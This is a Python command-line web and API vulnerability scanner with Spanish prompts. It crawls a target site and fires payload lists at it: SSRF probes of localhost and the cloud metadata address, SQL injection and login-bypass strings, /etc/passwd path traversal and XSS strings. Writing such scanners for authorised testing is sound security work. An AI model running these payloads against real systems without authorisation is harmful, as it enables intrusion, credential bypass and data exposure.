#!/usr/bin/env python3
import requests
import urllib.parse
import time
import re
import json
from datetime import datetime, timezone
from collections import deque
from concurrent.futures import ThreadPoolExecutor, as_completed

from bs4 import BeautifulSoup
from prettytable import PrettyTable

# ============================================================
# COLORES
# ============================================================

YELLOW = "\033[93m"
RESET = "\033[0m"
BOLD = "\033[1m"

REQUEST_TIMEOUT = 7
HEADERS_DEFAULT = {"User-Agent": "dast-web-cli/2.0"}
WEB_DEFAULT_SPIDER_DEPTH = 2
WEB_DEFAULT_MAX_URLS = 50

# ============================================================
# PAYLOADS
# ============================================================

SSRF_PAYLOADS_SAFE = [
    "http://127.0.0.1",
]

SSRF_PAYLOADS_AGGR = [
    "http://127.0.0.1:5000",
    "http://localhost",
    "http://localhost:5000",
    "http://169.254.169.254",
    "http://169.254.169.254/latest/meta-data/",
    "gopher://127.0.0.1:70/_",
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR 1=1 -- ",
    "'; --",
    "' OR SLEEP(3)--",
    "'\"",
]

SQLI_BYPASS_RAW = r"""
'-
' 
'&
'^
'*
' or ''-
' or '' 
" or "x"="x
or 1=1--
"""

SQLI_BYPASS_PAYLOADS = [x.strip() for x in SQLI_BYPASS_RAW.splitlines() if x.strip()]

LFI_PAYLOADS = [
    "../../etc/passwd",
    "../../../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
]

COMMON_PARAM_NAMES = ["q", "search", "id", "page", "lang", "file", "username", "user", "email"]

# ============================================================
# IDOR TRACKING
# ============================================================

IDOR_TRACKER = {}
IDOR_THRESHOLD = 5

# Set global para evitar duplicados: (module, base_url_key)
SEEN_FINDINGS = set()

# ============================================================
# ENDPOINT MODEL
# ============================================================

class Endpoint:
    def __init__(self, method, url, param_names=None, source=""):
        self.method = method.upper()
        self.url = url
        self.param_names = param_names or []
        self.source = source

    def key(self):
        return (self.method, self.url, tuple(sorted(self.param_names)))
    
    # ðŸ†• NUEVO MÃ‰TODO para obtener la URL base sin query/fragmento
    def base_url_key(self):
        parsed = urllib.parse.urlparse(self.url)
        # Devolvemos la URL sin parÃ¡metros de consulta ni fragmento
        return urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, "", ""))


# ============================================================
# HTTP UTILITIES
# ============================================================

def send_request(session, method, url, headers=None, params=None, data=None):
    headers = headers or HEADERS_DEFAULT
    try:
        if method.upper() == "GET":
            return session.get(url, headers=headers, params=params, timeout=REQUEST_TIMEOUT)
        return session.request(method.upper(), url, headers=headers, data=data, timeout=REQUEST_TIMEOUT)
    except Exception:
        return None

# ============================================================
# DETECTORES (SSRF, LFI, SQLi, XSS)
# ============================================================

def eval_response(module, resp, payload):
    if not resp:
        return False

    body = (resp.text or "").lower()
    ctype = resp.headers.get("Content-Type", "").lower()
    code = resp.status_code

    if module == "SSRF":
        # Si la respuesta es vÃ¡lida
        if code in [200, 301, 302]:

            # 1) carga HTML inesperada
            if "text/html" in ctype:
                if "<html" in body or "<title" in body:
                    return True

            # 2) Indicadores internos
            internal_keywords = [
                "localhost", "127.0.0.1", "internal", "admin", "hxploit", "metadata"
            ]
            if any(k in body for k in internal_keywords):
                return True

        return False

    # LFI
    if module == "LFI":
        patterns = ["root:x:0:", "daemon:x:", "/bin/bash", "nologin"]
        return any(p in body for p in patterns)

    # SQLi
    if module == "SQLi":
        if any(d in body for d in ["sql", "syntax", "mysql", "sqlite"]):
            return True
        return code >= 500

    # XSS
    if module == "XSS":
        return payload.lower() in body

    return False

# ============================================================
# LOGIN DETECTION
# ============================================================

def is_login_endpoint(ep: Endpoint) -> bool:
    if ep.method != "POST":
        return False
    lower = [n.lower() for n in ep.param_names]
    has_user = any(any(t in n for t in ["user", "email", "login"]) for n in lower)
    has_pass = any("pass" in n for n in lower)
    return has_user and has_pass

def build_login_payload(ep, username, password):
    data = {}
    for name in ep.param_names:
        lname = name.lower()
        if any(t in lname for t in ["user", "email", "login"]):
            data[name] = username
        elif "pass" in lname:
            data[name] = password
        else:
            data[name] = ""
    return data

# ============================================================
# IDOR DETECTION
# ============================================================

def detect_idor(ep: Endpoint):
    if ep.method != "GET":
        return None

    parsed = urllib.parse.urlparse(ep.url)
    qs = urllib.parse.parse_qs(parsed.query)

    # buscamos parÃ¡metro tipo id
    target_param = None
    for p in qs:
        if "id" in p.lower():
            target_param = p
            break

    if not target_param:
        return None

    try:
        val = int(qs[target_param][0])
    except:
        return None

    key = (parsed.path, target_param)

    if key not in IDOR_TRACKER:
        IDOR_TRACKER[key] = []

    IDOR_TRACKER[key].append(val)

    if len(IDOR_TRACKER[key]) == IDOR_THRESHOLD:
        return {
            "module": "IDOR",
            "severity": "MEDIO",
            "endpoint": f"GET {ep.url}",
            "payload": f"{target_param}={val}",
            "status": 200,
            "evidence": "Se detectÃ³ acceso consecutivo a objetos numerados.",
            "endpoint_obj": ep, # ðŸ†• AÃ±adido
        }

    return None

# ============================================================
# SPIDERING
# ============================================================

def normalize_url(base_netloc, url):
    if not url:
        return None
    url = url.strip()
    if url.startswith(("javascript:", "mailto:")):
        return None
    parsed = urllib.parse.urlparse(url)
    if not parsed.scheme:
        return url
    if parsed.netloc != base_netloc:
        return None
    return url

def crawl(start_url, max_depth, max_urls, headers=None):
    session = requests.Session()
    session.headers.update(headers or HEADERS_DEFAULT)

    base = urllib.parse.urlparse(start_url)
    base_netloc = base.netloc

    visited = set()
    endpoints = []
    q = deque([(start_url, 0)])

    while q and len(visited) < max_urls:
        url, depth = q.popleft()
        if url in visited or depth > max_depth:
            continue
        visited.add(url)

        try:
            resp = session.get(url, timeout=REQUEST_TIMEOUT)
        except Exception:
            continue

        if not resp or "text/html" not in resp.headers.get("Content-Type", ""):
            continue

        endpoints.append(Endpoint("GET", url, [], source="page"))

        soup = BeautifulSoup(resp.text, "html.parser")

        # links
        for a in soup.find_all("a", href=True):
            href = normalize_url(base_netloc, a["href"])
            if href:
                full = urllib.parse.urljoin(url, href)
                if full not in visited:
                    q.append((full, depth + 1))

        # forms
        for form in soup.find_all("form"):
            method = form.get("method", "GET").upper()
            action = form.get("action") or url
            act_norm = normalize_url(base_netloc, action)
            if not act_norm:
                continue

            full_action = urllib.parse.urljoin(url, act_norm)
            param_names = []

            for inp in form.find_all(["input", "textarea", "select"]):
                name = inp.get("name")
                if name and name not in param_names:
                    param_names.append(name)

            endpoints.append(Endpoint(method, full_action, param_names, source="form@" + url))

    final = {}
    for ep in endpoints:
        if ep.key() not in final:
            final[ep.key()] = ep

    return session, list(final.values())

# ============================================================
# GET VARIANTS
# ============================================================

def build_get_variants(url, payload):
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    variants = []

    if qs:
        for p in qs.keys():
            copy_qs = {k: list(v) for k, v in qs.items()}
            copy_qs[p] = [payload]
            new_query = urllib.parse.urlencode(copy_qs, doseq=True)
            new_url = urllib.parse.urlunparse(
                (parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment)
            )
            variants.append(new_url)

    else:
        for p in COMMON_PARAM_NAMES:
            new_query = urllib.parse.urlencode({p: payload})
            new_url = urllib.parse.urlunparse(
                (parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment)
            )
            variants.append(new_url)

    # dedup
    seen = set()
    out = []
    for v in variants:
        if v not in seen:
            seen.add(v)
            out.append(v)

    return out

# ============================================================
# MODULE WORKERS (SQLi, LFI, SSRF, XSS)
# ============================================================

def run_payload(module, session, ep, payload, mode, headers):
    url = ep.url

    # GET
    if ep.method == "GET":
        urls_to_test = build_get_variants(url, payload)
        if mode == "agresivo":
            urls_to_test.append(url.rstrip("/") + "/" + payload)

        for u in urls_to_test:
            r = send_request(session, "GET", u, headers=headers)
            if r and eval_response(module, r, payload):
                return {
                    "module": module,
                    "severity": "MEDIO",
                    "endpoint": f"GET {u}",
                    "payload": payload,
                    "status": r.status_code,
                    "evidence": r.text[:300],
                    "endpoint_obj": ep, # ðŸ†• AÃ±adido
                }
        return None

    # con body
    data = {}
    if ep.param_names:
        for p in ep.param_names:
            data[p] = payload
    else:
        for p in COMMON_PARAM_NAMES:
            data[p] = payload

    r = send_request(session, ep.method, url, headers=headers, data=data)
    if r and eval_response(module, r, payload):
        return {
            "module": module,
            "severity": "MEDIO",
            "endpoint": f"{ep.method} {url}",
            "payload": payload,
            "status": r.status_code,
            "evidence": r.text[:300],
            "endpoint_obj": ep, # ðŸ†• AÃ±adido
        }

    return None

def run_module(module_name, payloads, session, endpoint, headers, threads, mode):
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futures = {
            ex.submit(run_payload, module_name, session, endpoint, p, mode, headers): p
            for p in payloads
        }
        for fut in as_completed(futures):
            try:
                result = fut.result()
            except Exception:
                result = None
            if result:
                # SÃ³lo devolvemos un resultado por mÃ³dulo/endpoint
                return result
    return None

# ============================================================
# SQLi AUTH BYPASS
# ============================================================

def test_sqli_auth_bypass(session, ep, headers):
    if not is_login_endpoint(ep):
        return None

    url = ep.url

    login_fields = []
    for name in ep.param_names:
        lname = name.lower()
        if any(t in lname for t in ["user", "email", "login", "pass"]):
            login_fields.append(name)

    if not login_fields:
        login_fields = ep.param_names or ["username", "password"]

    for payload in SQLI_BYPASS_PAYLOADS:
        data = {field: payload for field in login_fields}
        r = send_request(session, "POST", url, headers=headers, data=data)
        if not r:
            continue

        body = (r.text or "").lower()

        if r.status_code == 200 and not any(bad in body for bad in ["invalid", "error", "incorrect"]):
            return {
                "module": "SQLiAuthBypass",
                "severity": "ALTO",
                "endpoint": f"POST {url}",
                "payload": payload,
                "status": r.status_code,
                "evidence": r.text[:300],
                "endpoint_obj": ep, # ðŸ†• AÃ±adido
            }

    return None

# ============================================================
# SQLi 500 DETECTOR
# ============================================================

def test_sqli_500(session, ep, headers):
    url = ep.url
    method = ep.method

    payload1 = "'"
    confirm_payload = "' OR 1=1--"

    if method == "GET":
        variants = build_get_variants(url, payload1)
        if not variants:
            return None

        test_url = variants[0]
        r = send_request(session, "GET", test_url, headers=headers)
        if r and r.status_code == 500:
            variants_conf = build_get_variants(url, confirm_payload)
            conf_url = variants_conf[0] if variants_conf else url
            r2 = send_request(session, "GET", conf_url, headers=headers)
            if r2 and r2.status_code != 500:
                return {
                    "module": "SQLi500Detector",
                    "severity": "ALTO",
                    "endpoint": f"GET {test_url}",
                    "payload": payload1,
                    "status": r.status_code,
                    "evidence": r.text[:200],
                    "endpoint_obj": ep, # ðŸ†• AÃ±adido
                }
        return None

    if not ep.param_names:
        return None

    data1 = {p: payload1 for p in ep.param_names}
    r = send_request(session, method, url, headers=headers, data=data1)

    if r and r.status_code == 500:
        data2 = {p: confirm_payload for p in ep.param_names}
        r2 = send_request(session, method, url, headers=headers, data=data2)
        if r2 and r2.status_code != 500:
            return {
                "module": "SQLi500Detector",
                "severity": "ALTO",
                "endpoint": f"{method} {url}",
                "payload": payload1,
                "status": r.status_code,
                "evidence": r.text[:200],
                "endpoint_obj": ep, # ðŸ†• AÃ±adido
            }

    return None

# ============================================================
# REPORTING
# ============================================================

def print_finding_live(f):
    print(
        f"{YELLOW}{BOLD}[!] {f['module']} detectado (Sev: {f['severity']}) "
        f"- {f['endpoint']}{RESET}"
    )
    print(f"{YELLOW}    Payload: {f['payload']}{RESET}")
    print(f"{YELLOW}    CÃ³digo HTTP: {f['status']}{RESET}")
    print(f"{YELLOW}    Evidencia:{RESET}")
    for line in str(f["evidence"]).splitlines():
        print(f"{YELLOW}      {line}{RESET}")
    print("\n" + "-" * 70 + "\n")

def print_table(findings):
    table = PrettyTable()
    table.field_names = ["Endpoint", "Vulnerabilidad", "Severidad", "Payload"]
    for f in findings:
        table.add_row([f["endpoint"], f["module"], f["severity"], f["payload"]])
    print("\n" + BOLD + "REPORTE CONSOLIDADO" + RESET)
    print(table)

# PequeÃ±o helper para manejar duplicados en un solo lugar
def register_finding(findings, finding):
    """
    AÃ±ade el hallazgo sÃ³lo si (module, base_url_key del Endpoint original) no ha sido visto antes.
    """
    # âš ï¸ ModificaciÃ³n para usar la base_url_key
    ep_obj = finding.pop("endpoint_obj", None)
    
    if ep_obj:
        # Usa la URL base para la clave de duplicado
        ep_key = ep_obj.base_url_key()
    else:
        # Fallback para mÃ³dulos que no proveen el objeto (aunque ahora todos lo hacen)
        ep_key = finding["endpoint"]

    key = (finding["module"], ep_key)
    
    if key in SEEN_FINDINGS:
        return
        
    SEEN_FINDINGS.add(key)
    findings.append(finding)
    print_finding_live(finding)

def build_export_payload(scan_type, target, mode, threads, used_token, findings, reachable):
    now_utc = datetime.now(timezone.utc)
    return {
        "scan_type": scan_type,
        "target": target,
        "mode": mode,
        "threads": threads,
        "used_token": used_token,
        "reachable": reachable,
        "findings_count": len(findings),
        "findings": findings,
        "exported_at_utc": now_utc.strftime("%Y-%m-%dT%H:%M:%SZ"),
    }

def export_findings_json(scan_type, target, mode, threads, used_token, findings, reachable):
    payload = build_export_payload(
        scan_type=scan_type,
        target=target,
        mode=mode,
        threads=threads,
        used_token=used_token,
        findings=findings,
        reachable=reachable,
    )

    timestamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
    filename = f"scan_result_{scan_type}_{timestamp}.json"

    with open(filename, "w", encoding="utf-8") as fp:
        json.dump(payload, fp, indent=2, ensure_ascii=False)

    return filename

# ============================================================
# INPUT VALIDATION / TARGET CHECKS
# ============================================================

def abort_invalid_input(message):
    print(f"[!] Error: {message}")
    raise SystemExit(1)

def normalize_and_validate_base_url(raw_url):
    candidate = (raw_url or "").strip()
    if not candidate:
        return None

    if not re.match(r"^https?://", candidate, flags=re.IGNORECASE):
        candidate = "http://" + candidate

    if any(ch.isspace() for ch in candidate):
        return None

    parsed = urllib.parse.urlparse(candidate)
    if parsed.scheme not in ("http", "https"):
        return None
    if not parsed.netloc or parsed.hostname is None:
        return None

    return candidate

def parse_choice(raw_value, allowed_values, default=None):
    value = (raw_value or "").strip().lower()
    if not value and default is not None:
        return default
    if value not in allowed_values:
        return None
    return value

def parse_positive_int(raw_value, default=None):
    value = (raw_value or "").strip()
    if not value and default is not None:
        return default
    try:
        parsed = int(value)
    except (TypeError, ValueError):
        return None
    if parsed <= 0:
        return None
    return parsed

def normalize_api_endpoint(raw_endpoint):
    endpoint = (raw_endpoint or "").strip()
    if not endpoint:
        return None
    if any(ch.isspace() for ch in endpoint):
        return None
    if endpoint.startswith(("http://", "https://")):
        return None
    if not endpoint.startswith("/"):
        endpoint = "/" + endpoint
    return endpoint

def check_target_reachability(url, headers=None):
    session = requests.Session()
    session.headers.update(headers or HEADERS_DEFAULT)
    try:
        response = session.get(url, timeout=REQUEST_TIMEOUT, allow_redirects=True)
        return True, f"HTTP {response.status_code}"
    except requests.RequestException as exc:
        return False, str(exc)
    except Exception as exc:
        return False, str(exc)

# ============================================================
# CLI PRINCIPAL
# ============================================================

def main():
    print("[+] DAST API/WEB - SSRF + IDOR Version")

    scan_type = parse_choice(
        input("[*] Tipo de escaneo (api/web) [web]: "),
        {"api", "web"},
        default="web",
    )
    if scan_type is None:
        abort_invalid_input("se ingreso un valor invalido para 'Tipo de escaneo'. Valores validos: api/web.")

    base = normalize_and_validate_base_url(input("[*] URL base: "))
    if not base:
        abort_invalid_input("URL invalido. Debe usar http/https y contener host valido.")

    api_endpoint = ""
    if scan_type == "api":
        api_endpoint = normalize_api_endpoint(input("[*] Endpoint API (ej: /api/users): "))
        if not api_endpoint:
            abort_invalid_input("se ingreso un endpoint API invalido. Debe ser una ruta valida como /api/users.")

    mode = parse_choice(
        input("[*] Modo (seguro/agresivo) [seguro]: "),
        {"seguro", "agresivo"},
        default="seguro",
    )
    if mode is None:
        abort_invalid_input("se ingreso un valor invalido para 'Modo'. Valores validos: seguro/agresivo.")

    use_token = parse_choice(
        input("[*] Deseas ingresar un token? (Y/n): "),
        {"y", "n"},
        default="y",
    )
    if use_token is None:
        abort_invalid_input("se ingreso un valor invalido para token. Valores validos: Y o n.")

    token = ""
    if use_token == "y":
        token = input("[*] Token: ").strip()
        if not token:
            abort_invalid_input("se eligio ingresar token, pero se dejo vacio.")

    request_headers = dict(HEADERS_DEFAULT)
    if token:
        if token.lower().startswith("bearer "):
            request_headers["Authorization"] = token
        else:
            request_headers["Authorization"] = f"Bearer {token}"

    threads = parse_positive_int(input("[*] Threads: "), default=10)
    if threads is None:
        abort_invalid_input("se ingreso un valor invalido para 'Threads'. Debe ser entero > 0.")

    ssrf_payloads = SSRF_PAYLOADS_AGGR if mode == "agresivo" else SSRF_PAYLOADS_SAFE
    if scan_type == "api":
        target_to_check = urllib.parse.urljoin(base.rstrip("/") + "/", api_endpoint.lstrip("/"))
    else:
        target_to_check = base

    reachable, reachability_info = check_target_reachability(target_to_check, request_headers)

    if not reachable:
        print("\n[!] El URL objetivo no es alcanzable o no responde. Se omite el escaneo.")
        session = requests.Session()
        session.headers.update(request_headers)
        endpoints = []
        spider_time = 0.0
    else:
        if scan_type == "web":
            print("\n[*] Spidering...")
            spider_start = time.time()
            session, endpoints = crawl(
                base,
                WEB_DEFAULT_SPIDER_DEPTH,
                WEB_DEFAULT_MAX_URLS,
                request_headers,
            )
            spider_time = time.time() - spider_start
        else:
            print("\n[*] Preparando endpoint API...")
            session = requests.Session()
            session.headers.update(request_headers)
            endpoints = [Endpoint("GET", target_to_check, [], source="api")]
            spider_time = 0.0

    print(f"[+] Endpoints descubiertos: {len(endpoints)}")
    print(f"[i] Tiempo spidering: {spider_time:.1f}s\n")

    findings = []
    modules_payload = [
        ("SSRF", ssrf_payloads),
        ("SQLi", SQLI_PAYLOADS),
        ("LFI", LFI_PAYLOADS),
        ("XSS", XSS_PAYLOADS),
    ]

    scan_time = 0.0
    if reachable and endpoints:
        print("[*] Iniciando escaneo...\n")
        scan_start = time.time()

        for ep in endpoints:
            print(f"\n[.] Analizando: {ep.method} {ep.url}")

            idor = detect_idor(ep)
            if idor:
                register_finding(findings, idor)

            if is_login_endpoint(ep):
                print("    [i] Endpoint LOGIN detectado.")
                if use_token == "y":
                    print("    [i] Token aplicado en headers para requests autenticados.")
                else:
                    ab = test_sqli_auth_bypass(session, ep, request_headers)
                    if ab:
                        register_finding(findings, ab)

            s500 = test_sqli_500(session, ep, request_headers)
            if s500:
                register_finding(findings, s500)

            for name, payloads in modules_payload:
                res = run_module(name, payloads, session, ep, request_headers, threads, mode)
                if res:
                    register_finding(findings, res)
                else:
                    print(f"    [-] {name}: no detectado")

        scan_time = time.time() - scan_start

    print("\n" + "=" * 70 + "\n")
    if not reachable:
        print(f"[!] El objetivo '{target_to_check}' no fue alcanzable o no respondio.")
        print(f"[i] Detalle de conexion: {reachability_info}")
    elif not findings:
        print("[-] No se encontraron vulnerabilidades.")
    else:
        print_table(findings)
        export_json = parse_choice(
            input("\n[*] Deseas exportar el resultado en formato JSON? (Y/n): "),
            {"y", "n"},
            default="y",
        )
        if export_json is None:
            abort_invalid_input("se ingreso un valor invalido para exportacion. Valores validos: Y o n.")
        if export_json == "y":
            try:
                output_file = export_findings_json(
                    scan_type=scan_type,
                    target=target_to_check,
                    mode=mode,
                    threads=threads,
                    used_token=(use_token == "y"),
                    findings=findings,
                    reachable=reachable,
                )
                print(f"[+] Resultado exportado en JSON: {output_file}")
            except OSError as exc:
                print(f"[!] Error: no se pudo exportar el JSON. Detalle: {exc}")

    print(f"\n[i] Tiempo total de escaneo: {scan_time:.1f}s")

if __name__ == "__main__":
    main()
